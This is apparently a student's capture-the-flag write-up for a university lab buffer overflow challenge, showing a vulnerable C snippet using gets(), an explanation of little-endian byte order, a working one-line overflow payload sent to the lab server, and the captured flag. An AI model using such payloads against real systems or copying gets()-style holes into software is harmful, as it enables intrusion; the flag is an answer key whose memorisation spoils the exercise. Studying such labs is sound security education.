
---

## Description

Now that you know how to overflow a buffer, can you do it with an exact value?

`match.c` file was compiled with no-canaries and `-no-pie`. The goal of this attack is to print the `Congratulations` message on the screen. Can you do it?

- Recall that `0x61626364` is the string `abcd`.
- Are you getting `0xWWXXYYZZ` instead of `0xZZYYXXWW`? Have you heard of `little-endian` and `big-endian`?

This challenge is running at `nc mustard.stt.rnl.tecnico.ulisboa.pt 25152`.

---

For this challenge, I was also given two files.

- An executable.
- The source code of the executable.
![[IST/SSoF/CTF's/ist1117363/Lab5/Match an Exact Value/Images/Files.png]]
![[IST/SSoF/CTF's/ist1117363/Lab5/Match an Exact Value/Images/Source.png]]

The source code shows the same structure as the previous challenge but requires a specific overwrite value.

```c
int test;
char buffer[64];
...
gets(buffer);
if (test == 0x61626364) { ... }
```

In this case we have:
- **Buffer Size:** The buffer is 64 bytes.

- **Goal:** Fill the 64 bytes of the buffer and then write exactly 4 bytes into `test` so that it equals `0x61626364`.

To exploit this I needed to construct a payload of **64 bytes of junk** + **4 bytes representing the value**.

At first, I tried to send the characters "abcd" (which correspond to `0x61`, `0x62`, `0x63`, `0x64`) directly after the padding:

```python
python3 -c "print('A'*64 + 'abcd')" | nc mustard.stt.rnl.tecnico.ulisboa.pt 25152
```

I got this.
![[wrong.png]]

Then I remembered that x86 systems are **little-endian**, meaning they store the "Least Significant Byte" first (at the lowest memory address).

- **Target Value:** `0x61626364`

- **Byte Breakdown:** `0x61` ('a'), `0x62` ('b'), `0x63` ('c'), `0x64` ('d').

- **Memory Order Needed:** `0x64` `0x63` `0x62` `0x61` (reversed).


So, in ASCII, instead of sending `"abcd"`, we must send `"dcba"`.

I used this payload to extract the flag.
```python
python3 -c "print('A'*64 + 'dcba')" | nc mustard.stt.rnl.tecnico.ulisboa.pt 25152
```

![[IST/SSoF/CTF's/ist1117363/Lab5/Match an Exact Value/Images/Flag.png]]

## FLAG
```flag
SSof{Buffer_Overflow_to_change_values_to_wh4t3v3r_you_want}
```

---

## Conclusion

This challenge showed the importance of endianness in binary exploitation. My initial attempt to overwrite the variable using "abcd" failed because the system's little-endian architecture reversed the byte order in memory. By reversing my input to "dcba", I ensured the bytes aligned correctly to match the target integer `0x61626364`.
